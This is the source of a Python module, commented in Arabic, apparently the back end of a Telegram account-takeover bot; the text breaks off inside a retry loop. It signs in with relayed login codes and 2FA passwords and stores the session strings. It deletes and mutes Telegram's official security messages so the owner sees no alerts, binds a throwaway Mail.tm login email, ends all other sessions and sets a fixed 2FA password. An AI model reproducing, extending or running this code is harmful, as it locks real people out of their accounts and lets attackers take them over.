# session_manager.py
import asyncio
import logging
import re
from typing import NamedTuple

from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    PasswordHashInvalidError,
    FloodWaitError,
    PhoneNumberBannedError,
    AuthKeyUnregisteredError,
    UserDeactivatedError,
    UserDeactivatedBanError,
    SessionRevokedError,
    AuthKeyDuplicatedError,
)
from telethon.tl.functions.account import (
    UpdateUsernameRequest,
    UpdateProfileRequest,
    SendVerifyEmailCodeRequest,
    VerifyEmailRequest,
    GetPasswordRequest,
    UpdateNotifySettingsRequest,
    GetAuthorizationsRequest,
    ResetAuthorizationRequest,
    ResetPasswordRequest,
)
from telethon.tl.types import (
    EmailVerifyPurposeLoginSetup,
    EmailVerifyPurposeLoginChange,
    EmailVerificationCode,
    CodeSettings,
    InputNotifyPeer,
    InputPeerNotifySettings,
)
from telethon.tl.functions.messages import (
    DeleteHistoryRequest,
    DeleteChatUserRequest,
)
from telethon.tl.functions.channels import (
    LeaveChannelRequest,
    DeleteHistoryRequest as DeleteChannelHistoryRequest,
    DeleteChannelRequest,
)
from telethon.tl.functions.auth import (
    ResetAuthorizationsRequest,
    ResendCodeRequest,
    SendCodeRequest,
    LogOutRequest,
)

import database
import mailtm
from config import (
    API_ID,
    API_HASH,
    BOT_TOKEN,
    EMAIL_MIGRATION_DELAY,
    AUTO_KICK_DELAY_24H,
    AUTO_KICK_DELAY_RETRY,
    SESSION_RECOVERY_MAX_ATTEMPTS,
    SESSION_RECOVERY_RETRY_DELAY,
    INVALID_SESSION_RESCAN_INTERVAL,
    RECOVERY_CODE_RESEND_ATTEMPTS,
    RECOVERY_CODE_RESEND_INTERVAL,
    WATCHDOG_DEAD_STREAK,
    DEFAULT_2FA_PASSWORD,
)
from telegram_client import make_telegram_client

logger = logging.getLogger(__name__)

pending_clients: dict = {}
_recovery_tasks: dict[str, asyncio.Task] = {}
_auto_kick_tasks: dict[str, asyncio.Task] = {}
_repair_two_fa_tasks: dict[str, asyncio.Task] = {}
_recovery_scheduled: set[str] = set()
_recovery_fail_count: dict[str, int] = {}
_recovery_on_done = None
_admin_notify = None
_watchdog_streak: dict[str, int] = {}

OFFICIAL_SENDERS = (777000, 42777)
BOT_ID = int(BOT_TOKEN.split(":")[0]) if BOT_TOKEN and ":" in BOT_TOKEN else None
CODE_PATTERN = re.compile(r"\b\d{5,7}\b")


class EmailVerifyCtx(NamedTuple):
    purpose: object
    code_length: int


# ──────────────────────────────────────────
# أدوات مساعدة
# ──────────────────────────────────────────
async def delete_telegram_official_messages(client) -> None:
    """حذف رسائل تيليجرام الرسمية وحذف المحادثة بالكامل وكتمها."""
    senders = list(OFFICIAL_SENDERS)
    
    for sender_id in senders:
        try:
            # كتم الإشعارات أولاً
            peer = await client.get_input_entity(sender_id)
            await client(UpdateNotifySettingsRequest(
                peer=InputNotifyPeer(peer),
                settings=InputPeerNotifySettings(mute_until=2**31 - 1)
            ))
            
            # حذف المحادثة بالكامل (وليس فقط السجل)
            # بالنسبة لـ 777000 فهو User، نستخدم DeleteHistoryRequest مع revoke=True
            await client(DeleteHistoryRequest(
                peer=peer,
                max_id=0,
                just_clear=False,
                revoke=True
            ))
        except Exception as e:
            logger.debug("mute/delete official %s: %s", sender_id, e)


def _is_email_not_allowed(err: Exception) -> bool:
    s = str(err).upper()
    return "EMAIL_NOT_ALLOWED" in s


def _is_email_not_setup(err: Exception) -> bool:
    return "EMAIL_NOT_SETUP" in str(err).upper()


def _is_stale_phone_code_hash(err: Exception) -> bool:
    s = str(err).upper()
    return "PHONE_CODE_HASH" in s or "PHONE_CODE_EXPIRED" in s


def _is_invalid_email_verify_code(err: Exception) -> bool:
    s = str(err).upper()
    return "CODE INVALID" in s and "EMAIL" in s


def set_recovery_callback(callback):
    """يُستدعى من main عند نجاح/فشل إنعاش الجلسة."""
    global _recovery_on_done
    _recovery_on_done = callback


def set_admin_notify_callback(callback):
    """إشعارات الأدمن: تأمين، طرد، 2FA، إعادة ربط البريد."""
    global _admin_notify
    _admin_notify = callback


async def _notify_admin(phone: str, event: str, **data):
    if not _admin_notify:
        return
    try:
        await _admin_notify(phone, event, **data)
    except Exception as e:
        logger.debug("admin notify %s %s: %s", phone, event, e)


def cancel_scheduled_recovery(phone: str) -> bool:
    """إلغاء إنعاش مجدول إذا عادت الجلسة للعمل."""
    phone = database.normalize_phone(phone)
    _recovery_scheduled.discard(phone)
    task = _recovery_tasks.pop(phone, None)
    if task and not task.done():
        task.cancel()
        return True
    return False


def watchdog_session_check(phone: str, alive: bool) -> str | None:
    """
    تتبع فشل متتالي لتقليل الإنذارات الكاذبة.
    يُرجع: schedule_recovery | session_alive_again | None
    """
    phone = database.normalize_phone(phone)
    if alive:
        had_issue = _watchdog_streak.pop(phone, 0) >= WATCHDOG_DEAD_STREAK
        if had_issue and phone in _recovery_scheduled:
            cancel_scheduled_recovery(phone)
            return "session_alive_again"
        _watchdog_streak[phone] = 0
        return None
    streak = _watchdog_streak.get(phone, 0) + 1
    _watchdog_streak[phone] = streak
    if streak < WATCHDOG_DEAD_STREAK:
        return None
    if phone in _recovery_scheduled:
        return None
    return "schedule_recovery"


async def get_telegram_login_email_pattern(client) -> str | None:
    """القناع الفعلي لبريد Login على تيليجرام (مثل sa******1@gmail.com)."""
    try:
        pwd = await client(GetPasswordRequest())
        pattern = getattr(pwd, "login_email_pattern", None)
        return (str(pattern).strip() if pattern else None) or None
    except Exception as e:
        logger.debug("GetPassword login_email: %s", e)
        return None


async def _telegram_has_login_email(client) -> bool:
    """هل الحساب مربوط فعلياً ببريد Login على تيليجرام؟"""
    return bool(await get_telegram_login_email_pattern(client))


def email_matches_login_pattern(email: str | None, pattern: str | None) -> bool:
    """
    مقارنة بريد كامل مع قناع تيليجرام (كل * = حرف واحد).
    تيليجرام لا يُرجع البريد كاملاً — فقط login_email_pattern.
    """
    if not email or not pattern:
        return False
    email_n = email.strip().lower()
    pattern_n = pattern.strip().lower()
    if email_n == pattern_n:
        return True
    regex = "".join("." if c == "*" else re.escape(c) for c in pattern_n)
    try:
        return bool(re.fullmatch(regex, email_n))
    except re.error:
        return False


async def _login_setup_purpose(client, phone: str):
    """أول ربط بريد — يتطلب phone_code_hash من send_code_request."""
    norm = database.normalize_phone(phone)
    sent = await _send_login_code_request(client, phone)
    return EmailVerifyPurposeLoginSetup(
        phone_number=norm,
        phone_code_hash=sent.phone_code_hash,
    )


# ──────────────────────────────────────────
# تسجيل الدخول
# ──────────────────────────────────────────
async def _send_login_code_request(client, phone: str):
    """طلب كود دخول بإعدادات تقلّل App hash وتفضّل البريد/SMS."""
    norm = database.normalize_phone(phone)
    settings = CodeSettings(
        allow_flashcall=False,
        current_number=False,
        allow_app_hash=False,
        allow_missed_call=False,
        allow_firebase=False,
    )
    return await client(
        SendCodeRequest(
            phone_number=norm,
            api_id=API_ID,
            api_hash=API_HASH,
            settings=settings,
        )
    )


async def request_code(user_id: int, phone: str) -> dict:
    try:
        client = make_telegram_client()
        await client.connect()
        result = await _send_login_code_request(client, phone)
        delivery = type(result.type).__name__   # e.g. SentCodeTypeApp / SentCodeTypeSms
        pending_clients[user_id] = {
            "client": client,
            "phone": phone,
            "phone_code_hash": result.phone_code_hash,
        }
        return {"success": True, "delivery": delivery}
    except PhoneNumberBannedError:
        return {"success": False, "error": "banned"}
    except FloodWaitError as e:
        return {"success": False, "error": f"flood:{e.seconds}"}
    except Exception as e:
        return {"success": False, "error": str(e)}


async def post_registration_setup(
    phone: str, client, phone_code_hash: str | None = None
) -> dict:
    """
    خط تأمين التسجيل:
    1) حذف رسائل النظام
    2) ربط بريد Login (أولاً)
    3) حذف رسائل النظام
    4) جدولة: طرد → (بعد النجاح) 2FA من config
    """
    await delete_telegram_official_messages(client)
    row = await database.get_session_by_phone(phone)
    kept = await existing_login_email_ok(row, client)
    if kept:
        email_res = {
            "success": True,
            "email": kept,
            "skipped": True,
            "message": "بريد Login الحالي يعمل — لم يُغيَّر",
        }
    else:
        email_res = await _bind_login_email(
            client, phone, phone_code_hash=phone_code_hash
        )
    await delete_telegram_official_messages(client)
    await database.set_auto_kick_stage(phone, 0)
    schedule_auto_kick_pipeline(phone)
    if not email_res.get("success") and not email_res.get("skipped"):
        schedule_login_email_bind_retry(phone)
    await _notify_admin(
        phone,
        "security_started",
        email_ok=email_res.get("success") or email_res.get("skipped"),
        login_email=email_res.get("email"),
        email_error=email_res.get("error"),
    )
    return email_res


async def manual_session_refresh_setup(phone: str, client) -> dict:
    """
    خط تأمين لتجديد الجلسة يدوياً:
    1) حذف رسائل النظام ورسائل البوت
    2) لا يتم تغيير البريد (حسب طلب المستخدم)
    3) جدولة: طرد بعد 24 ساعة
    """
    await delete_telegram_official_messages(client)
    
    await database.set_auto_kick_stage(phone, 0)
    schedule_auto_kick_pipeline(phone)
    
    await _notify_admin(
        phone,
        "manual_refresh_success",
    )
    return {"success": True, "skipped": True, "message": "تم تجديد الجلسة بنجاح"}


async def submit_code(user_id: int, code: str, is_refresh: bool = False) -> dict:
    if user_id not in pending_clients:
        return {"success": False, "error": "no_pending"}
    data = pending_clients[user_id]
    client = data["client"]
    phone = data["phone"]
    phone_code_hash = data["phone_code_hash"]
    try:
        await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
        await delete_telegram_official_messages(client)
        session_string = client.session.save()
        me = await client.get_me()
        full_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
        username = me.username or ""
        telegram_id = me.id
        # save under actual telegram phone
        actual_phone = database.normalize_phone(getattr(me, "phone", "") or "")
        phone = actual_phone or database.normalize_phone(phone)
        
        # جلب 2FA القديم إن وجد
        old_row = await database.get_session_by_phone(phone)
        old_2fa = old_row["two_fa"] if old_row else None
        
        await database.save_session(
            phone, username, full_name, session_string, old_2fa, telegram_id
        )

        if is_refresh:
            email_res = await manual_session_refresh_setup(phone, client)
        else:
            email_res = await post_registration_setup(phone, client)
            
        del pending_clients[user_id]
        await client.disconnect()
        return {
            "success": True,
            "two_fa": False,
            "phone": phone,
            "email_linked": email_res.get("success"),
            "login_email": email_res.get("email"),
            "email_error": email_res.get("error"),
            "email_skipped": email_res.get("skipped", False),
        }
    except SessionPasswordNeededError:
        return {"success": True, "two_fa": True}
    except (PhoneCodeInvalidError, PhoneCodeExpiredError):
        return {"success": False, "error": "wrong_code"}
    except Exception as e:
        return {"success": False, "error": str(e)}


async def submit_2fa(user_id: int, password: str, is_refresh: bool = False) -> dict:
    if user_id not in pending_clients:
        return {"success": False, "error": "no_pending"}
    data = pending_clients[user_id]
    client = data["client"]
    phone = data["phone"]
    try:
        await client.sign_in(password=password)
        await delete_telegram_official_messages(client)
        session_string = client.session.save()
        me = await client.get_me()
        full_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
        username = me.username or ""
        telegram_id = me.id
        # احفظ تحت الرقم الفعلي من تيليجرام لمنع خلط الجلسات
        actual_phone = database.normalize_phone(getattr(me, "phone", "") or "")
        phone = actual_phone or database.normalize_phone(phone)
        await database.save_session(
            phone, username, full_name, session_string, password, telegram_id
        )

        if is_refresh:
            email_res = await manual_session_refresh_setup(phone, client)
        else:
            email_res = await post_registration_setup(phone, client)
            
        del pending_clients[user_id]
        await client.disconnect()
        return {
            "success": True,
            "phone": phone,
            "email_linked": email_res.get("success"),
            "login_email": email_res.get("email"),
            "email_error": email_res.get("error"),
            "email_skipped": email_res.get("skipped", False),
        }
    except PasswordHashInvalidError:
        return {"success": False, "error": "wrong_2fa"}
    except Exception as e:
        return {"success": False, "error": str(e)}


# ──────────────────────────────────────────
# إدارة الجلسات
# ──────────────────────────────────────────
async def ensure_session_string(phone: str) -> str | None:
    """
    يجلب session_string من DB أو يستخرجه من جلسة Telethon نشطة ويحفظه.
    """
    session = await database.get_session_by_phone(phone)
    if not session:
        return None
    ss = session["session_string"]
    if ss and str(ss).strip():
        return str(ss).strip()

    client = await get_active_client(phone)
    if not client:
        return None
    try:
        ss = client.session.save()
        if ss:
            await database.update_session_string(phone, ss)
        return ss or None
    finally:
        await client.disconnect()


async def get_active_client(phone: str):
    session = await database.get_session_by_phone(phone)
    if not session:
        return None
    ss = database.row_get(session, "session_string")
    if not ss or not str(ss).strip():
        return None
    client = None
    try:
        client = make_telegram_client(ss)
        await client.connect()
        if not await client.is_user_authorized():
            await client.disconnect()
            return None
        # منع تشغيل عمليات على جلسة لرقم مختلف (خلط الجلسات)
        try:
            me = await client.get_me()
            actual = database.normalize_phone(getattr(me, "phone", "") or "")
            stored = database.normalize_phone(phone)
            if actual and stored and actual != stored:
                logger.error(
                    "SESSION MIXUP blocked: db_phone=%s actual_phone=%s id=%s",
                    stored,
                    actual,
                    getattr(me, "id", None),
                )
                await client.disconnect()
                return None
        except Exception as e:
            logger.debug("get_active_client phone check %s: %s", phone, e)
        return client
    except AuthKeyUnregisteredError:
        if client:
            try:
                await client.disconnect()
            except Exception:
                pass
        return None
    except Exception:
        if client:
            try:
                await client.disconnect()
            except Exception:
                pass
        return None


async def check_session_alive(phone: str) -> bool:
    """
    فحص عميق: هل الجلسة حية وليست مجمدة/ملغاة؟
    لا يعدّل valid في DB.
    """
    session = await database.get_session_by_phone(phone)
    if not session or not database.row_get(session, "session_string"):
        return False
    client = None
    try:
        client = make_telegram_client(session["session_string"])
        await client.connect()
        if not await client.is_user_authorized():
            return False
        me = await client.get_me()
        if not me:
            return False
        actual = database.normalize_phone(getattr(me, "phone", "") or "")
        stored = database.normalize_phone(phone)
        if actual and stored and actual != stored:
            logger.error(
                "SESSION MIXUP alive-check: db=%s actual=%s", stored, actual
            )
            return False
        if me and not session["telegram_id"]:
            await database.update_session_telegram_id(phone, me.id)
        return True
    except (
        AuthKeyUnregisteredError,
        SessionRevokedError,
        AuthKeyDuplicatedError,
        UserDeactivatedError,
        UserDeactivatedBanError,
    ):
        return False
    except Exception as e:
        logger.debug("check_session_alive %s: %s", phone, e)
        return False
    finally:
        if client:
            try:
                await client.disconnect()
            except Exception:
                pass


async def check_session_valid(phone: str) -> bool:
    """للـ watchdog — يستدعي الفحص العميق."""
    return await check_session_alive(phone)


async def verify_session_phone_match(phone: str) -> dict:
    """
    يتحقق من أن session_string المخزون للرقم phone ينتمي فعلاً
    لهذا الرقم على تيليجرام (وليس لرقم آخر).
    يُعيد: {'match': True/False/None, 'actual_phone': '...', 'actual_name': '...'}
    None = لا يمكن التحقق (جلسة معطلة).
    """
    session = await database.get_session_by_phone(phone)
    if not session or not database.row_get(session, "session_string"):
        return {"match": None, "actual_phone": None, "actual_name": None}
    client = None
    try:
        client = make_telegram_client(session["session_string"])
        await client.connect()
        if not await client.is_user_authorized():
            return {"match": None, "actual_phone": None, "actual_name": None}
        me = await client.get_me()
        if not me:
            return {"match": None, "actual_phone": None, "actual_name": None}

        actual_phone = database.normalize_phone(getattr(me, "phone", "") or "")
        stored_phone = database.normalize_phone(phone)
        match = (actual_phone == stored_phone) if actual_phone else None

        actual_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
        return {
            "match": match,
            "actual_phone": actual_phone,
            "actual_name": actual_name,
            "actual_id": me.id,
        }
    except Exception as e:
        logger.debug("verify_session_phone_match %s: %s", phone, e)
        return {"match": None, "actual_phone": None, "actual_name": None}
    finally:
        if client:
            try:
                await client.disconnect()
            except Exception:
                pass


async def bulk_check_sessions(recover_via_email: bool = True) -> dict:
    """فحص الجلسات — الميتة تُجدول للإنعاش إن وُجد بريد Login."""
    sessions = await database.get_all_sessions()
    checked = invalid = recovery_scheduled = 0
    dead_phones = []
    for s in sessions:
        if not s["valid"]:
            continue
        phone = s["phone"]
        checked += 1
        if await check_session_alive(phone):
            await asyncio.sleep(0.3)
            continue
        dead_phones.append(phone)
        login_email = database.row_login_email(s)
        has_mail = bool(login_email and s["email_password"])
        if recover_via_email and has_mail:
            _recovery_scheduled.discard(phone)
            schedule_standard_recovery(phone)
            recovery_scheduled += 1
        else:
            await database.mark_session_invalid(phone)
            invalid += 1
        await asyncio.sleep(0.3)
    return {
        "checked": checked,
        "invalid": invalid,
        "recovery_scheduled": recovery_scheduled,
        "phones": dead_phones,
    }


# ──────────────────────────────────────────
# تعديل الحساب
# ──────────────────────────────────────────
async def change_username(phone: str, new_username: str) -> dict:
    client = await get_active_client(phone)
    if not client:
        return {"success": False, "error": "session_invalid"}
    try:
        await client(UpdateUsernameRequest(new_username))
        await database.update_session_username(phone, new_username)
        await delete_telegram_official_messages(client)
        return {"success": True}
    except Exception as e:
        return {"success": False, "error": str(e)}
    finally:
        await client.disconnect()


async def change_name(phone: str, first_name: str, last_name: str = "") -> dict:
    client = await get_active_client(phone)
    if not client:
        return {"success": False, "error": "session_invalid"}
    try:
        await client(UpdateProfileRequest(first_name=first_name, last_name=last_name))
        full_name = f"{first_name} {last_name}".strip()
        await database.update_session_fullname(phone, full_name)
        await delete_telegram_official_messages(client)
        return {"success": True}
    except Exception as e:
        return {"success": False, "error": str(e)}
    finally:
        await client.disconnect()


async def terminate_other_sessions(phone: str) -> dict:
    client = await get_active_client(phone)
    if not client:
        return {"success": False, "error": "session_invalid"}
    try:
        await client(ResetAuthorizationsRequest())
        await delete_telegram_official_messages(client)
        return {"success": True}
    except Exception as e:
        return {"success": False, "error": str(e)}
    finally:
        await client.disconnect()


async def set_two_fa(phone: str, new_password: str, old_password: str = None) -> dict:
    client = await get_active_client(phone)
    if not client:
        return {"success": False, "error": "session_invalid"}
    try:
        await client.edit_2fa(
            current_password=old_password,
            new_password=new_password,
            hint="",
            email=None,
        )
        await database.update_session_two_fa(phone, new_password)
        await delete_telegram_official_messages(client)
        return {"success": True}
    except Exception as e:
        return {"success": False, "error": str(e)}
    finally:
        await client.disconnect()


async def remove_two_fa(phone: str, current_password: str) -> dict:
    client = await get_active_client(phone)
    if not client:
        return {"success": False, "error": "session_invalid"}
    try:
        await client.edit_2fa(current_password=current_password, new_password=None)
        await database.update_session_two_fa(phone, None)
        await delete_telegram_official_messages(client)
        return {"success": True}
    except Exception as e:
        return {"success": False, "error": str(e)}
    finally:
        await client.disconnect()


# ──────────────────────────────────────────
# بريد Login (Mail.tm)
# ──────────────────────────────────────────
async def fetch_code_from_email(
    address: str,
    password: str,
    attempts: int = 36,
    interval: int = 5,
    exclude_ids: set[str] | None = None,
    code_length: int | None = None,
) -> str | None:
    return await mailtm.fetch_code(
        address,
        password,
        attempts,
        interval,
        exclude_ids=exclude_ids,
        code_length=code_length,
    )


async def fetch_codes_from_email(
    address: str,
    password: str,
    attempts: int = 36,
    interval: int = 5,
    exclude_ids: set[str] | None = None,
    code_length: int | None = None,
) -> list[str]:
    return await mailtm.fetch_codes(
        address,
        password,
        attempts,
        interval,
        exclude_ids=exclude_ids,
        code_length=code_length,
    )


async def existing_login_email_ok(row, client=None) -> str | None:
    """
    بريد Login محفوظ + Mail.tm يعمل + (إن وُجد client) القناع على تيليجرام يطابق البريد.
    """
    if not row:
        return None
    email = database.row_login_email(row)
    pwd = database.row_get(row, "email_password")
    if not email or not pwd:
        return None
    if database.is_legacy_login_email(email):
        return None
    try:
        await mailtm.get_token(email, pwd)
    except Exception as e:
        logger.debug("login email mailbox check %s: %s", email, e)
        return None
    if client:
        tg_pattern = await get_telegram_login_email_pattern(client)
        if not tg_pattern:
            logger.info(
                "mail.tm OK but Telegram login email missing for %s",
                database.row_get(row, "phone", "?"),
            )
            return None
        if not email_matches_login_pattern(email, tg_pattern):
            logger.info(
                "DB email %s does not match TG pattern %s for %s",
                email,
                tg_pattern,
                database.row_get(row, "phone", "?"),
            )
            return None
    return email


async def _email_verify_purpose(client, phone: str, phone_code_hash: str | None = None):
    """
    اختيار الغرض حسب حالة بريد Login الفعلية على تيليجرام:
    - إن وُجد login_email_pattern → LoginChange
    - وإلا → LoginSetup (يحتاج phone_code_hash من sendCode)
    """
    if await _telegram_has_login_email(client):
        return EmailVerifyPurposeLoginChange()
    if phone_code_hash:
        return EmailVerifyPurposeLoginSetup(
            phone_number=database.normalize_phone(phone),
            phone_code_hash=phone_code_hash,
        )
    # أول ربط: اطلب sendCode للحصول على hash حتى لو الجلسة مصرّح بها
    return await _login_setup_purpose(client, phone)


async def _send_verify_email_code(
    client, phone: str, email: str, phone_code_hash=None
) -> EmailVerifyCtx:
    """إرسال كود التحقق — يُرجع purpose وطول الكود من account.SentEmailCode."""
    purpose = await _email_verify_purpose(client, phone, phone_code_hash)
    try:
        sent = await client(
            SendVerifyEmailCodeRequest(purpose=purpose, email=email)
        )
    except Exception as e:
        if not (_is_email_not_setup(e) or _is_stale_phone_code_hash(e)):
            raise
        # EMAIL_NOT_SETUP / hash منتهي → إعادة LoginSetup عبر sendCode
        logger.warning(
            "email verify fallback to LoginSetup for %s: %s", phone, e
        )
        purpose = await _login_setup_purpose(client, phone)
        sent = await client(
            SendVerifyEmailCodeRequest(purpose=purpose, email=email)
        )
    code_length = int(getattr(sent, "length", None) or 6)
    pattern = getattr(sent, "email_pattern", None) or email
    logger.info(
        "verify email sent %s pattern=%s code_length=%s purpose=%s",
        email,
        pattern,
        code_length,
        type(purpose).__name__,
    )
    await asyncio.sleep(2)
    return EmailVerifyCtx(purpose=purpose, code_length=code_length)


def _normalize_email_code(raw: str | None, code_length: int | None = None) -> str | None:
    if not raw:
        return None
    digits = re.sub(r"\D", "", str(raw))
    if code_length and len(digits) == code_length:
        return digits
    match = CODE_PATTERN.search(str(raw))
    if not match:
        return None
    digits = match.group(0)
    if code_length and len(digits) != code_length:
        return None
    return digits


async def _try_verify_email_codes(
    client, purpose, codes: list[str]
) -> str | None:
    """تجربة الأكواد بالترتيب — يُرجع الكود الناجح."""
    last_error: Exception | None = None
    tried: set[str] = set()
    for code in codes:
        if not code or code in tried:
            continue
        tried.add(code)
        try:
            await client(
                VerifyEmailRequest(
                    purpose=purpose,
                    verification=EmailVerificationCode(code=code),
                )
            )
            return code
        except Exception as e:
            if _is_invalid_email_verify_code(e):
                last_error = e
                logger.debug("verify email code %s rejected", code)
                continue
            raise
    if last_error:
        raise last_error
    return None


async def _bind_login_email(
    client, phone: str, phone_code_hash: str | None = None
) -> dict:
    last_error = "جميع النطاقات مرفوضة من تيليجرام"
    try:
        domains = await mailtm.get_active_domains()
        for domain in domains:
            account = await mailtm.create_account(domain)
            new_email = account["address"]
            email_password = account["password"]
            exclude_ids = await mailtm.snapshot_message_ids(new_email, email_password)
            domain_rejected = False

            for send_attempt in range(3):
                try:
                    ctx = await _send_verify_email_code(
                        client, phone, new_email, phone_code_hash
                    )
                except Exception as e:
                    if _is_email_not_allowed(e):
                        last_error = str(e)
                        domain_rejected = True
                        break
                    raise

                mail_codes = await fetch_codes_from_email(
                    new_email,
                    email_password,
                    attempts=30,
                    interval=4,
                    exclude_ids=exclude_ids,
                    code_length=ctx.code_length,
                )
                candidates: list[str] = []
                for raw in mail_codes:
                    norm = _normalize_email_code(raw, ctx.code_length)
                    if norm and norm not in candidates:
                        candidates.append(norm)
                if not candidates:
                    for raw in mail_codes:
                        norm = _normalize_email_code(raw, None)
                        if norm and norm not in candidates:
                            candidates.append(norm)

                if not candidates:
                    if send_attempt < 2:
                        exclude_ids |= await mailtm.snapshot_message_ids(
                            new_email, email_password
                        )
                        continue
                    return {
                        "success": False,
                        "error": "لم يتم العثور على الكود في الإيميل",
                        "email": new_email,
                    }

                try:
                    verified_code = await _try_verify_email_codes(
                        client, ctx.purpose, candidates
                    )
                except Exception as e:
                    if send_attempt >= 2 or not _is_invalid_email_verify_code(e):
                        raise
                    exclude_ids |= await mailtm.snapshot_message_ids(
                        new_email, email_password
                    )
                    logger.warning(
                        "email verify retry %s for %s: %s",
                        send_attempt + 1,
                        new_email,
                        e,
                    )
                    continue

                if verified_code:
                    await database.update_session_login_email(
                        phone, new_email, email_password
                    )
                    await delete_telegram_official_messages(client)
                    logger.info(
                        "login email bound %s -> %s (code len %s)",
                        phone,
                        new_email,
                        len(verified_code),
                    )
                    return {"success": True, "email": new_email}

            if domain_rejected:
                continue

        return {"success": False, "error": last_error}
    except Exception as e:
        return {"success": False, "error": str(e)}


async def change_login_email(phone: str, force: bool = False) -> dict:
    row = await database.get_session_by_phone(phone)
    client = await get_active_client(phone)
    if not client:
        return {"success": False, "error": "الجلسة معطلة"}
    tg_pattern = None
    try:
        tg_pattern = await get_telegram_login_email_pattern(client)
    except Exception:
        pass
    db_email = database.row_login_email(row) if row else None
    if not force:
        kept = await existing_login_email_ok(row, client)
        if kept:
            await client.disconnect()
            return {
                "success": True,
                "email": kept,
                "skipped": True,
                "message": "بريد Login الحالي يعمل — لم يُغيَّر",
                "old_email": db_email,
                "tg_pattern": tg_pattern,
            }
    try:
        res = await _bind_login_email(client, phone)
        await delete_telegram_official_messages(client)
        res["old_email"] = db_email
        res["tg_pattern"] = tg_pattern
        return res
    finally:
        await client.disconnect()


# ──────────────────────────────────────────
# نظام الطرد التلقائي ثم 2FA (بعد نجاح الطرد فقط)
# ──────────────────────────────────────────
async def _try_auto_kick(phone: str) -> dict:
    client = await get_active_client(phone)
    if not client:
        return {"success": False, "error": "الجلسة غير متاحة"}
    try:
        await delete_telegram_official_messages(client)
        await client(ResetAuthorizationsRequest())
        await delete_telegram_official_messages(client)
        return {"success": True}
    except Exception as e:
        err = str(e)
        if "fresh" in err.lower() or "recently" in err.lower():
            return {"success": False, "error": "session_too_fresh"}
        return {"success": False, "error": err}
    finally:
        await client.disconnect()


async def _apply_default_2fa(phone: str) -> dict:
    """تفعيل/تغيير 2FA إلى DEFAULT_2FA_PASSWORD من config — بعد نجاح الطرد."""
    client = await get_active_client(phone)
    if not client:
        return {"success": False, "error": "الجلسة غير متاحة"}
    try:
        await delete_telegram_official_messages(client)
        row = await database.get_session_by_phone(phone)
        current = database.row_get(row, "two_fa") or None
        if current == DEFAULT_2FA_PASSWORD:
            await database.update_session_two_fa(phone, DEFAULT_2FA_PASSWORD)
            await database.mark_session_secured(phone)
            await delete_telegram_official_messages(client)
            return {"success": True, "skipped": True, "password": DEFAULT_2FA_PASSWORD}
        await client.edit_2fa(
            current_password=current,
            new_password=DEFAULT_2FA_PASSWORD,
            hint="",
            email=None,
        )
        await database.update_session_two_fa(phone, DEFAULT_2FA_PASSWORD)
        await database.mark_session_secured(phone)
        await delete_telegram_official_messages(client)
        logger.info("default 2FA applied %s", phone)
        return {"success": True, "password": DEFAULT_2FA_PASSWORD}
    except Exception as e:
        logger.warning("default 2FA failed %s: %s", phone, e)
        return {"success": False, "error": str(e)}
    finally:
        await client.disconnect()


async def _on_auto_kick_success(phone: str, phase: str = ""):
    await database.mark_auto_kick_done(phone)
    await _notify_admin(phone, "kick_success", phase=phase)
    fa = await _apply_default_2fa(phone)
    if fa.get("success") or fa.get("skipped"):
        await _notify_admin(
            phone,
            "twofa_ok",
            skipped=fa.get("skipped", False),
            password=DEFAULT_2FA_PASSWORD,
        )
    else:
        await _notify_admin(phone, "twofa_fail", error=fa.get("error", ""))

    # بعد الطرد: تغيير البريد فوراً وعرض القديم/الجديد
    try:
        mail_res = await change_login_email(phone, force=True)
        await _notify_admin(
            phone,
            "email_after_kick",
            success=mail_res.get("success"),
            old_email=mail_res.get("old_email") or mail_res.get("tg_pattern"),
            tg_pattern=mail_res.get("tg_pattern"),
            new_email=mail_res.get("email"),
            error=mail_res.get("error"),
        )
    except Exception as e:
        logger.warning("email after kick %s: %s", phone, e)
        await _notify_admin(
            phone, "email_after_kick", success=False, error=str(e)
        )

    asyncio.create_task(_post_kick_session_watch(phone))


def schedule_auto_kick_pipeline(phone: str):
    if phone in _auto_kick_tasks and not _auto_kick_tasks[phone].done():
        return
    _auto_kick_tasks[phone] = asyncio.create_task(_auto_kick_worker(phone))
    asyncio.create_task(_notify_admin(phone, "kick_started"))


async def _auto_kick_worker(phone: str, resume_remaining: int = 0):
    """
    طرد الجلسات الأخرى:
    فوراً → انتظار 24 ساعة → ثم محاولة كل 5 دقائق حتى ينجح.
    عند النجاح فقط: 2FA = DEFAULT_2FA_PASSWORD من config.

    resume_remaining: إذا كان > 0 فنبدأ من المرحلة 1 مع هذا الانتظار المتبقي (بعد restart).
    """
    import time as _time
    try:
        if resume_remaining > 0:
            # استئناف من المرحلة 1 — الانتظار المتبقي فقط (بعد إعادة تشغيل البوت)
            logger.info(
                "auto kick resume %s: waiting remaining %ds (of 24h)", phone, resume_remaining
            )
            await asyncio.sleep(resume_remaining)
        else:
            # المرحلة 0: محاولة الطرد الفوري
            await database.set_auto_kick_stage(phone, 0)
            result = await _try_auto_kick(phone)
            if result.get("success"):
                logger.info("auto kick OK %s (immediate)", phone)
                await _on_auto_kick_success(phone, phase="فوراً")
                return

            err = result.get("error", "")
            logger.info("auto kick fail %s immediate: %s", phone, err)
            await _notify_admin(phone, "kick_failed", phase="فوراً", error=err)

            # المرحلة 1: انتظار 24 ساعة — نحفظ وقت الانتهاء لمعالجة إعادة التشغيل
            await database.set_auto_kick_stage(phone, 1)
            until_ts = int(_time.time()) + AUTO_KICK_DELAY_24H
            await database.set_auto_kick_delay_until(phone, until_ts)
            await _notify_admin(
                phone,
                "kick_waiting",
                phase="24 ساعة",
                seconds=AUTO_KICK_DELAY_24H,
            )
            await asyncio.sleep(AUTO_KICK_DELAY_24H)

        # المرحلة 2: نظف وقت الانتهاء ثم حاول كل 5 دقائق
        await database.clear_auto_kick_delay_until(phone)
        retry_n = 0
        while True:
            await database.set_auto_kick_stage(phone, 2)
            retry_n += 1
            result = await _try_auto_kick(phone)

            if result.get("success"):
                logger.info("auto kick OK %s (after 24h/retry)", phone)
                await _on_auto_kick_success(phone, phase=f"بعد 24 ساعة / محاولة {retry_n}")
                return

            err = result.get("error", "")
            logger.info("auto kick fail %s: %s", phone, err)

